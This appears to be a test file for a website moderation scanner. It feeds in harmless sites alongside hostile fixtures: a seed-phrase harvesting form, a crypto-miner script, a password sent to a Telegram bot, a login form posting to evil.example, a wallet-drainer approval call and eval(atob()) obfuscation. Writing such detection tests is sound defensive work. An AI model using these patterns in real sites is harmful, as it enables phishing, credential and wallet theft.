// Pre-publish scanner tests, no network: npx tsx scripts/scan.test.ts
import assert from "node:assert";
import { scanFiles, scanProject, safeBrowsing, urlsOf } from "../lib/moderation/scan";

const page = (body: string, title = "Clay Studio") =>
  `<!doctype html><html><head><title>${title}</title><link href="https://fonts.googleapis.com/css2?family=Inter" rel="stylesheet"></head><body>${body}</body></html>`;
const rules = (files: { path: string; content: string }[], allowedHosts: string[] = []) =>
  scanFiles(files, { allowedHosts }).map((f) => `${f.rule}:${f.severity}`).sort();

async function main() {
  // ---- legitimate sites: no findings ----
  assert.deepEqual(rules([
    { path: "index.html", content: page(`<h1>Clay Studio</h1><p>Handmade ceramics.</p><a href="https://instagram.com/claystudio">Instagram</a>
      <form action="mailto:hi@claystudio.co"><input name="email" type="email"><textarea name="message"></textarea><button>Send</button></form>
      <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.14.1/dist/cdn.min.js"></script>`) },
    { path: "style.css", content: "body{font-family:Inter}" },
    { path: "hero.png", content: "data:image/png;base64,iVBORw0KGgo=" },
  ]), [], "landing page");
  assert.deepEqual(rules([
    { path: "login.html", content: page(`<h1>Members</h1><form id="f"><input type="email"><input type="password"><button>Sign in</button></form>
      <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4"></script>
      <script>const sb = supabase.createClient("https://abcd.supabase.co", "anon"); f.onsubmit = (e) => { e.preventDefault(); sb.auth.signInWithPassword({}) }</script>`) },
  ]), [], "Supabase login page");
  assert.deepEqual(rules([
    { path: "app.js", content: `const c = createWalletClient({ chain }); await c.writeContract({ functionName: "transfer", args: [to, amount] });` },
  ]), [], "simple token transfer dApp");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<h1>Wallet tips</h1><p>Never share your seed phrase with anyone, including support staff.</p>`) }]), [], "security advice mentioning seed phrase");

  // ---- blocked ----
  assert.deepEqual(rules([{ path: "index.html", content: page(`<h1>Validate wallet</h1><textarea name="seed_phrase" placeholder="Enter your 12-word recovery phrase"></textarea>`) }]),
    ["seed_phrase:block"], "seed phrase field");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<p>Please enter your recovery phrase to sync your wallet.</p><input name="w1"><input name="w2">`) }]),
    ["seed_phrase:block"], "seed phrase wording");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<script src="https://coinhive.com/lib/coinhive.min.js"></script>`) }]), ["crypto_miner:block"], "miner");
  assert.deepEqual(rules([
    { path: "index.html", content: page(`<form><input name="user"><input type="password" name="pass"></form><script src="app.js"></script>`) },
    { path: "app.js", content: `fetch("https://api.telegram.org/bot123:ABC/sendMessage", { method: "POST", body })` },
  ]), ["exfiltration:block"], "password sent to a Telegram bot");

  // ---- review (publish allowed, moderators notified) ----
  assert.deepEqual(rules([{ path: "index.html", content: page(`<h1>Sign in</h1><form><input type="email"><input type="password"></form>`, "MetaMask - Verify your account") }]),
    ["impersonation:review"], "brand + login");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<form action="https://collect.evil.example/p"><input type="password"></form>`) }]),
    ["credential_form:review"], "password posted off-site");
  assert.deepEqual(rules([{ path: "mint.js", content: `await nft.write.setApprovalForAll([attacker, true]);` }]), ["wallet_drainer:review"], "setApprovalForAll");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<script>eval(atob("YWxlcnQoMSk="))</script>`) }]), ["obfuscation:review"], "eval(atob())");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<meta http-equiv="refresh" content="0; url=https://other.example/">`) }]), ["external_redirect:review"], "meta refresh");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<script>window.location.href = "https://other.example/x"</script>`) }], ["other.example"]), [], "allowed redirect host");
  assert.deepEqual(rules([{ path: "index.html", content: page(`<iframe src="https://ads.example/x" width="0" height="0"></iframe>`) }]), ["hidden_iframe:review"], "hidden iframe");

  // ---- URL extraction + Safe Browsing (mocked) ----
  const files = [{ path: "index.html", content: page(`<a href="https://bad.example/login">x</a> <img src="data:image/png;base64,AAAA">`) }];
  assert.ok(urlsOf(files).includes("https://bad.example/login"));
  delete process.env.GOOGLE_SAFE_BROWSING_KEY;
  assert.deepEqual(await safeBrowsing(["https://bad.example/login"]), [], "no key: skipped");
  process.env.GOOGLE_SAFE_BROWSING_KEY = "test";
  let sent: any;
  globalThis.fetch = (async (_u: string, init: any) => {
    sent = JSON.parse(init.body);
    return new Response(JSON.stringify({ matches: [{ threatType: "SOCIAL_ENGINEERING", threat: { url: "https://bad.example/login" } }] }));
  }) as any;
  const r = await scanProject(files);
  assert.ok(sent.threatInfo.threatEntries.some((e: any) => e.url === "https://bad.example/login"));
  assert.equal(r.blocked, true); assert.equal(r.findings[0].rule, "safe_browsing"); assert.equal(r.findings[0].category, "phishing");
  globalThis.fetch = (async () => { throw new Error("offline"); }) as any;
  assert.equal((await scanProject(files)).blocked, false, "Safe Browsing outage fails open");

  console.log("scan tests: OK");
}
main().catch((e) => { console.error(e); process.exit(1); });
